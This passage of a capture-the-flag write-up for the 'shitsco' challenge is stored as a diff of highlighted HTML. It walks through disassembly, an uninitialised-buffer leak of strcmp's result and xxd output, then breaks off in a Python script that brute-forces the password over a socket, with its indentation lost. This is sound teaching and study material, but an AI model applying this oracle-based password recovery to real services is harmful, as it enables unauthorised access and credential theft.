+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804928</span><span class='n'>F</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='mi'>1</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049296</span>                 <span class='n'>call</span>    <span class='n'>___printf_chk</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804929</span><span class='n'>B</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804929</span><span class='n'>B</span> <span class='nl'>loc_804929B:</span>                            <span class='o'>;</span> <span class='n'>CODE</span> <span class='nl'>XREF:</span> <span class='n'>enable</span><span class='o'>+</span><span class='n'>A5j</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804929</span><span class='n'>B</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='n'>esi</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804929</span><span class='n'>E</span>                 <span class='n'>call</span>    <span class='n'>sub_8049090</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>A3</span>                 <span class='n'>mov</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>cookie</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>A7</span>                 <span class='n'>xor</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='n'>large</span> <span class='nl'>gs:</span><span class='mi'>14</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>AE</span>                 <span class='n'>jnz</span>     <span class='kt'>short</span> <span class='n'>loc_8049322</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B0</span>                 <span class='n'>add</span>     <span class='n'>esp</span><span class='o'>,</span> <span class='mi'>44</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B3</span>                 <span class='n'>pop</span>     <span class='n'>ebx</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B4</span>                 <span class='n'>pop</span>     <span class='n'>esi</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B5</span>                 <span class='n'>retn</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B5</span> <span class='o'>;</span> <span class='o'>---------------------------------------------------------------------------</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B6</span>                 <span class='n'>align</span> <span class='mi'>4</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B8</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B8</span> <span class='nl'>loc_80492B8:</span>                            <span class='o'>;</span> <span class='n'>CODE</span> <span class='nl'>XREF:</span> <span class='n'>enable</span><span class='o'>+</span><span class='mi'>51</span><span class='n'>j</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>B8</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='n'>offset</span> <span class='n'>aAuthentication</span> <span class='o'>;</span> <span class='s'>&quot;Authentication Successful&quot;</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>BF</span>                 <span class='n'>mov</span>     <span class='nl'>ds:</span><span class='n'>admin_privs</span><span class='o'>,</span> <span class='mi'>1</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>C9</span>                 <span class='n'>mov</span>     <span class='nl'>ds:</span><span class='n'>prompt</span><span class='o'>,</span> <span class='mi'>23</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D0</span>                 <span class='n'>call</span>    <span class='n'>_puts</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D5</span>                 <span class='n'>jmp</span>     <span class='kt'>short</span> <span class='n'>loc_804929B</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D5</span> <span class='o'>;</span> <span class='o'>---------------------------------------------------------------------------</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D7</span>                 <span class='n'>align</span> <span class='mi'>4</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D8</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D8</span> <span class='nl'>loc_80492D8:</span>                            <span class='o'>;</span> <span class='n'>CODE</span> <span class='nl'>XREF:</span> <span class='n'>enable</span><span class='o'>+</span><span class='mi'>19</span><span class='n'>j</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>D8</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>src</span><span class='o'>],</span> <span class='n'>offset</span> <span class='n'>aPleaseEnterAPa</span> <span class='o'>;</span> <span class='s'>&quot;Please enter a password: &quot;</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>E0</span>                 <span class='n'>lea</span>     <span class='n'>ebx</span><span class='o'>,</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>s2</span><span class='o'>]</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>E4</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='mi'>1</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>EB</span>                 <span class='n'>call</span>    <span class='n'>___printf_chk</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>F0</span>                 <span class='n'>mov</span>     <span class='n'>eax</span><span class='o'>,</span> <span class='nl'>ds:</span><span class='n'>stdout</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>F5</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='n'>eax</span> <span class='o'>;</span> <span class='n'>stream</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>F8</span>                 <span class='n'>call</span>    <span class='n'>_fflush</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>080492</span><span class='n'>FD</span>                 <span class='n'>mov</span>     <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>term</span><span class='o'>],</span> <span class='mi'>0</span><span class='n'>Ah</span> <span class='o'>;</span> <span class='n'>term</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049305</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>n</span><span class='o'>],</span> <span class='mi'>20</span><span class='n'>h</span> <span class='o'>;</span> <span class='n'>a3</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804930</span><span class='n'>D</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>src</span><span class='o'>],</span> <span class='n'>ebx</span> <span class='o'>;</span> <span class='n'>a2</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049311</span>                 <span class='n'>mov</span>     <span class='o'>[</span><span class='n'>esp</span><span class='o'>+</span><span class='mi'>4</span><span class='n'>Ch</span><span class='o'>+</span><span class='n'>dest</span><span class='o'>],</span> <span class='mi'>0</span> <span class='o'>;</span> <span class='n'>fd</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049318</span>                 <span class='n'>call</span>    <span class='n'>read_n_until</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>0804931</span><span class='n'>D</span>                 <span class='n'>jmp</span>     <span class='n'>loc_8049267</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049322</span> <span class='o'>;</span> <span class='o'>---------------------------------------------------------------------------</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049322</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049322</span> <span class='nl'>loc_8049322:</span>                            <span class='o'>;</span> <span class='n'>CODE</span> <span class='nl'>XREF:</span> <span class='n'>enable</span><span class='o'>+</span><span class='mi'>7</span><span class='n'>Ej</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049322</span>                 <span class='n'>call</span>    <span class='n'>___stack_chk_fail</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049322</span> <span class='n'>enable</span>          <span class='n'>endp</span>
+</code></pre></div>
+<p>Here is the C decompiled version of the function that is a bit clearer:</p>
+<div class='highlight'><pre><code class='java'><span class='kt'>int</span> <span class='n'>__cdecl</span> <span class='nf'>enable</span><span class='o'>(</span><span class='kd'>const</span> <span class='kt'>char</span> <span class='o'>**</span><span class='n'>a1</span><span class='o'>)</span>
+<span class='o'>{</span>
+  <span class='kd'>const</span> <span class='kt'>char</span> <span class='o'>*</span><span class='n'>v1</span><span class='o'>;</span> <span class='c1'>// ebx@2</span>
+  <span class='kt'>char</span> <span class='n'>s2</span><span class='o'>[</span><span class='mi'>32</span><span class='o'>];</span> <span class='c1'>// [sp+18h] [bp-34h]@2</span>
+  <span class='kt'>int</span> <span class='n'>v4</span><span class='o'>;</span> <span class='c1'>// [sp+38h] [bp-14h]@3</span>
+  <span class='kt'>int</span> <span class='n'>cookie</span><span class='o'>[</span><span class='mi'>4</span><span class='o'>];</span> <span class='c1'>// [sp+3Ch] [bp-10h]@1</span>
+
+  <span class='n'>cookie</span><span class='o'>[</span><span class='mi'>0</span><span class='o'>]</span> <span class='o'>=</span> <span class='o'>*</span><span class='n'>MK_FP</span><span class='o'>(</span><span class='n'>__GS__</span><span class='o'>,</span> <span class='mi'>20</span><span class='o'>);</span>
+  <span class='k'>if</span> <span class='o'>(</span> <span class='o'>*</span><span class='n'>a1</span> <span class='o'>)</span>
+  <span class='o'>{</span>
+   <span class='n'>v1</span> <span class='o'>=</span> <span class='n'>s2</span><span class='o'>;</span>
+   <span class='n'>strncpy</span><span class='o'>(</span><span class='n'>s2</span><span class='o'>,</span> <span class='o'>*</span><span class='n'>a1</span><span class='o'>,</span> <span class='mi'>32</span><span class='n'>u</span><span class='o'>);</span>
+  <span class='o'>}</span>
+  <span class='k'>else</span>
+  <span class='o'>{</span>
+   <span class='n'>v1</span> <span class='o'>=</span> <span class='n'>s2</span><span class='o'>;</span>
+   <span class='n'>__printf_chk</span><span class='o'>(</span><span class='mi'>1</span><span class='o'>,</span> <span class='s'>&quot;Please enter a password: &quot;</span><span class='o'>);</span>
+   <span class='n'>fflush</span><span class='o'>(</span><span class='n'>stdout</span><span class='o'>);</span>
+   <span class='n'>read_n_until</span><span class='o'>(</span><span class='mi'>0</span><span class='o'>,</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>s2</span><span class='o'>,</span> <span class='mi'>32</span><span class='o'>,</span> <span class='mi'>10</span><span class='o'>);</span>
+  <span class='o'>}</span>
+  <span class='n'>v4</span> <span class='o'>=</span> <span class='n'>strcmp</span><span class='o'>((</span><span class='kd'>const</span> <span class='kt'>char</span> <span class='o'>*)</span><span class='n'>password_mem</span><span class='o'>,</span> <span class='n'>v1</span><span class='o'>);</span>
+  <span class='k'>if</span> <span class='o'>(</span> <span class='n'>v4</span> <span class='o'>)</span>
+  <span class='o'>{</span>
+   <span class='n'>__printf_chk</span><span class='o'>(</span><span class='mi'>1</span><span class='o'>,</span> <span class='s'>&quot;Nope.  The password isn&#39;t %s\n&quot;</span><span class='o'>,</span> <span class='n'>v1</span><span class='o'>);</span>
+  <span class='o'>}</span>
+  <span class='k'>else</span>
+  <span class='o'>{</span>
+   <span class='n'>admin_privs</span> <span class='o'>=</span> <span class='mi'>1</span><span class='o'>;</span>
+   <span class='n'>prompt</span> <span class='o'>=</span> <span class='sc'>&#39;#&#39;</span><span class='o'>;</span>
+   <span class='n'>puts</span><span class='o'>(</span><span class='s'>&quot;Authentication Successful&quot;</span><span class='o'>);</span>
+  <span class='o'>}</span>
+  <span class='n'>sub_8049090</span><span class='o'>((</span><span class='kt'>void</span> <span class='o'>**)</span><span class='n'>a1</span><span class='o'>);</span>
+  <span class='k'>return</span> <span class='o'>*</span><span class='n'>MK_FP</span><span class='o'>(</span><span class='n'>__GS__</span><span class='o'>,</span> <span class='mi'>20</span><span class='o'>)</span> <span class='o'>^</span> <span class='n'>cookie</span><span class='o'>[</span><span class='mi'>0</span><span class='o'>];</span>
+<span class='o'>}</span>
+</code></pre></div>
+<p>I’ve labeled a few things here like the local variables and the recv_n_until function. Notice that s2 or [esp+4Ch+src] is the destination buffer for the password we enter. It also looks possible to run enable &lt; password &gt; and not get prompted for the password. This results in a strncpy and the other prompting path read the password with a call to recv_n_until. Here is the interesting thing: When I tried the strncpy code path, I did not get the leak behavior:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>enable</span>
+<span class='n'>Please</span> <span class='n'>enter</span> <span class='n'>a</span> <span class='nl'>password:</span> <span class='n'>AAAAA</span>
+<span class='n'>Nope</span><span class='o'>.</span>  <span class='n'>The</span> <span class='n'>password</span> <span class='n'>isn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>AAAAA</span><span class='err'>`</span><span class='n'>x</span><span class='err'>▒</span><span class='nd'>@dx</span><span class='err'>▒▒▒`▒</span><span class='n'>d</span><span class='err'>▒`▒▒▒</span><span class='n'>z</span><span class='err'>▒</span>
+<span class='n'>$</span> <span class='n'>enable</span> <span class='n'>AAAAA</span>
+<span class='n'>Nope</span><span class='o'>.</span>  <span class='n'>The</span> <span class='n'>password</span> <span class='n'>isn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>AAAAA</span>
+<span class='n'>$</span>
+</code></pre></div>
+<p>So, what is the difference? Let’s have a quick look at the strncpy man page, namely the bit that says “If the length of src is less than n, strncpy() writes additional null bytes to dest to ensure that a total of n bytes are written.” On the prompting code path, our string is not being null terminated but if we enter the password with the enable command it is null terminated. We can also see that the s2 variable on the stack is never initialized to 0. There is no memset call.</p>
+
+<p>Still we don’t have the password. It doesn’t exist in the leaked data. Leaks are very useful in exploitation as a defeat to ASLR. We might have enough information here to recover base addresses of the stack or libc. However, the path we are on to get the flag does not involve taking advantage of memory corruption. Is there anything in this leak that could give us something useful?</p>
+
+<p>To answer this question let’s look at the stack layout and what is actually getting printed back to us:</p>
+<div class='highlight'><pre><code class='java'><span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>dest</span>            <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>4</span><span class='n'>Ch</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>src</span>             <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>48</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>n</span>               <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>44</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>term</span>            <span class='o'>=</span> <span class='kt'>byte</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>40</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>s2</span>              <span class='o'>=</span> <span class='kt'>byte</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>34</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>var_14</span>          <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>14</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>cookie</span>          <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span> <span class='o'>-</span><span class='mi'>10</span><span class='n'>h</span>
+<span class='o'>.</span><span class='na'>text</span><span class='o'>:</span><span class='mi'>08049230</span> <span class='n'>arg_0</span>           <span class='o'>=</span> <span class='n'>dword</span> <span class='n'>ptr</span>  <span class='mi'>4</span>
+</code></pre></div>
+<p>Therefore, if we are copying into s2 and we only leak data after the 4th character, we can assume that by default in the uninitialized stack there is a null at s2[3]. Overwriting this with user data causes our string to not terminate until we run into a null later on up the stack. What is var_14?</p>
+<div class='highlight'><pre><code class='java'><span class='n'>v4</span> <span class='o'>=</span> <span class='n'>strcmp</span><span class='o'>((</span><span class='kd'>const</span> <span class='kt'>char</span> <span class='o'>*)</span><span class='n'>password_mem</span><span class='o'>,</span> <span class='n'>v1</span><span class='o'>);</span>
+</code></pre></div>
+<p>It turns out that var_14 (or v4) is the return from strcmp. Hummm. Here is what the main page has to say about that “The strcmp() and strncmp() functions return an integer less than, equal to, or greater than zero if s1 (or the first n bytes thereof) is found, respectively, to be less than, to match, or be greater than s2.” What this means is that we can tell if our input string is less than or greater than the password on the remote machine. Let’s try it locally first. Our password locally is “asdf”. Let’s see if we can divine the first character using this method. The var_14 variable should be the 33rd character we get back:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span>  <span class='n'>python</span> <span class='o'>-</span><span class='n'>c</span> <span class='s'>&quot;import sys;sys.stdout.write(&#39;enable\n&#39; + &#39; &#39;*80 + &#39;\n&#39;)&quot;</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>shitsco</span> <span class='o'>|</span><span class='n'>xxd</span>
+<span class='err'>…</span>
+<span class='mi'>0000210</span><span class='o'>:</span> <span class='mi'>2070</span> <span class='mi'>6173</span> <span class='mi'>7377</span> <span class='mi'>6</span><span class='n'>f72</span> <span class='mi'>643</span><span class='n'>a</span> <span class='mi'>204</span><span class='n'>e</span> <span class='mi'>6</span><span class='n'>f70</span> <span class='mi'>652</span><span class='n'>e</span>   <span class='nl'>password:</span> <span class='n'>Nope</span><span class='o'>.</span>
+<span class='mi'>0000220</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>5468</span> <span class='mi'>6520</span> <span class='mi'>7061</span> <span class='mi'>7373</span> <span class='mi'>776</span><span class='n'>f</span> <span class='mi'>7264</span> <span class='mi'>2069</span>    <span class='n'>The</span> <span class='n'>password</span> <span class='n'>i</span>
+<span class='mi'>0000230</span><span class='o'>:</span> <span class='mi'>736</span><span class='n'>e</span> <span class='mi'>2774</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>  <span class='n'>sn</span><span class='err'>&#39;</span><span class='n'>t</span>
+<span class='mi'>0000240</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>
+<span class='mi'>0000250</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2001</span> <span class='mi'>0</span><span class='n'>a24</span> <span class='mi'>200</span><span class='n'>a</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>       <span class='o'>..</span><span class='n'>$</span> <span class='o'>.</span>
+</code></pre></div>
+<p>I picked the space character for our password because on the ascii table space (0x20) is the lowest value printable character. We can see that the bit in bold here was 0x0100 as var_14. The null after the 0x1 is implied. Now, what happens if we set this to ‘a’ + 79 spaces?</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span> <span class='n'>python</span> <span class='o'>-</span><span class='n'>c</span> <span class='s'>&quot;import sys;sys.stdout.write(&#39;enable\na&#39; + &#39; &#39;*79 + &#39;\n&#39;)&quot;</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>shitsco</span> <span class='o'>|</span><span class='n'>xxd</span>
+<span class='mi'>0000220</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>5468</span> <span class='mi'>6520</span> <span class='mi'>7061</span> <span class='mi'>7373</span> <span class='mi'>776</span><span class='n'>f</span> <span class='mi'>7264</span> <span class='mi'>2069</span>    <span class='n'>The</span> <span class='n'>password</span> <span class='n'>i</span>
+<span class='mi'>0000230</span><span class='o'>:</span> <span class='mi'>736</span><span class='n'>e</span> <span class='mi'>2774</span> <span class='mi'>2061</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>  <span class='n'>sn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>a</span>
+<span class='mi'>0000240</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>
+<span class='mi'>0000250</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2001</span> <span class='mi'>0</span><span class='n'>a24</span> <span class='mi'>200</span><span class='n'>a</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>       <span class='o'>..</span><span class='n'>$</span> <span class='o'>.</span>
+<span class='mi'>0000260</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>
+</code></pre></div>
+<p>Remember, that ‘a’ was actually the first character of our password locally and we still got a 0x1 back. How about ‘b’?</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span> <span class='n'>python</span> <span class='o'>-</span><span class='n'>c</span> <span class='s'>&quot;import sys;sys.stdout.write(&#39;enable\nb&#39; + &#39; &#39;*79 + &#39;\n&#39;)&quot;</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>shitsco</span> <span class='o'>|</span><span class='n'>xxd</span>
+<span class='mi'>0000220</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>5468</span> <span class='mi'>6520</span> <span class='mi'>7061</span> <span class='mi'>7373</span> <span class='mi'>776</span><span class='n'>f</span> <span class='mi'>7264</span> <span class='mi'>2069</span>    <span class='n'>The</span> <span class='n'>password</span> <span class='n'>i</span>
+<span class='mi'>0000230</span><span class='o'>:</span> <span class='mi'>736</span><span class='n'>e</span> <span class='mi'>2774</span> <span class='mi'>2062</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>  <span class='n'>sn</span><span class='err'>&#39;</span><span class='n'>t</span> <span class='n'>b</span>
+<span class='mi'>0000240</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>
+<span class='mi'>0000250</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>20</span><span class='n'>ff</span> <span class='n'>ffff</span> <span class='n'>ff0a</span> <span class='mi'>2420</span> <span class='mi'>0</span><span class='n'>a20</span> <span class='mi'>2020</span>       <span class='o'>.....</span><span class='n'>$</span> <span class='o'>.</span>
+<span class='mi'>0000260</span><span class='o'>:</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span> <span class='mi'>2020</span>
+</code></pre></div>
+<p>Bingo. Here we have a value of 0xffffffff for var_14. Therefore, we know that the string we sent in is numerically higher than the actual password. The last character we tried, ‘a’, was still giving us back 0x01. When we see the value of var_14 change to -1 we know that the correct character was not the most recent attempt but the one prior to it. We can send all characters sequentially until we find the password.</p>
+
+<h3 id="automation">Automation</h3>
+
+<p>The password used on the remote server is probably short enough that we could disclose it by hand. However, as a general rule in life, if I have to do something more than a few times I almost always save time by writing a quick python script to automate. Since we are going to be running this on a remote target I’ve set the server to run over a TCP port with some fancy piping over a fifo pipe.</p>
+<div class='highlight'><pre><code class='java'><span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span> <span class='n'>mkfifo</span> <span class='n'>pipe</span>
+<span class='n'>shitsco</span><span class='nd'>@ubuntu</span><span class='o'>:~</span><span class='n'>$</span> <span class='n'>nc</span> <span class='o'>-</span><span class='n'>l</span> <span class='mi'>31337</span> <span class='o'>&lt;</span> <span class='n'>pipe</span> <span class='o'>|</span> <span class='o'>./</span><span class='n'>shitsco</span> <span class='o'>&gt;</span> <span class='n'>pipe</span>
+</code></pre></div>
+<p>Here is a python script that will discover the password used. I’ve changed the password file on my local system to the one that was used during the game:</p>
+<div class='highlight'><pre><code class='java'><span class='kn'>import</span> <span class='nn'>socket</span>
+<span class='kn'>import</span> <span class='nn'>string</span>
+<span class='kn'>import</span> <span class='nn'>sys</span>
+
+<span class='n'>s</span><span class='o'>=</span><span class='n'>socket</span><span class='o'>.</span><span class='na'>socket</span><span class='o'>()</span>
+    
+<span class='n'>s</span><span class='o'>.</span><span class='na'>connect</span><span class='o'>((</span><span class='s'>&quot;192.168.1.151&quot;</span><span class='o'>,</span> <span class='mi'>31337</span><span class='o'>))</span>
+<span class='n'>s</span><span class='o'>.</span><span class='na'>recv</span><span class='o'>(</span><span class='mi'>1024</span><span class='o'>)</span>
+    
+<span class='n'>def</span> <span class='nf'>try_pass</span><span class='o'>(</span><span class='n'>passwd</span><span class='o'>):</span>
+<span class='n'>s</span><span class='o'>.</span><span class='na'>send</span><span class='o'>(</span><span class='s'>&quot;enable\n&quot;</span><span class='o'>)</span>
+<span class='n'>s</span><span class='o'>.</span><span class='na'>recv</span><span class='o'>(</span><span class='mi'>1024</span><span class='o'>)</span>
+<span class='n'>s</span><span class='o'>.</span><span class='na'>send</span><span class='o'>(</span><span class='n'>passwd</span> <span class='o'>+</span> <span class='s'>&quot;\n&quot;</span><span class='o'>)</span>
+<span class='n'>ret</span> <span class='o'>=</span> <span class='n'>s</span><span class='o'>.</span><span class='na'>recv</span><span class='o'>(</span><span class='mi'>1024</span><span class='o'>)</span>
+<span class='k'>if</span> <span class='n'>ret</span><span class='o'>.</span><span class='na'>find</span><span class='o'>(</span><span class='s'>&quot;Authentication Successful&quot;</span><span class='o'>)</span> <span class='o'>!=</span> <span class='o'>-</span><span class='mi'>1</span><span class='o'>:</span>
+<span class='k'>return</span> <span class='s'>&quot;!&quot;</span>
+<span class='k'>return</span> <span class='n'>ret</span><span class='o'>[</span><span class='n'>ret</span><span class='o'>.</span><span class='na'>find</span><span class='o'>(</span><span class='s'>&quot;$&quot;</span><span class='o'>)-</span><span class='mi'>2</span><span class='o'>]</span>
+
+<span class='n'>chars</span> <span class='o'>=</span> <span class='o'>[]</span>
+<span class='k'>for</span> <span class='n'>x</span> <span class='n'>in</span> <span class='n'>string</span><span class='o'>.</span><span class='na'>printable</span><span class='o'>:</span>
+<span class='n'>chars</span><span class='o'>.</span><span class='na'>append</span><span class='o'>(</span><span class='n'>x</span><span class='o'>)</span>
